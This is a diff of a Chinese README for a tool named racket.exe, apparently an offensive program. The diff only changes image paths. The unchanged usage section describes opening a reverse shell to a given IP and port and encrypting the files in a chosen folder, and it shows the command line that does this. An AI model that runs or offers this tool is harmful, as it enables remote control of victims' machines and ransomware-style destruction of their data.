@@ -10,7 +10,7 @@
 ### 使用方法
 
 使用参数-h查看
-![image-20230531182210373](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230531182210373.png)
+![](image/1.png)
 
 #### 给定IP端口反弹shell,加密指定文件夹中的文件
 
@@ -18,8 +18,6 @@
 racket.exe -H IP -P port "C:\Users\Administrator\Desktop\test"
 ```
 
-![image-20230531191933670](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230531191933670.png)
+![](image/2.png)
 
-#### 
-
-![image-20230531192758763](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230531192758763.png)
+![](image/3.png)
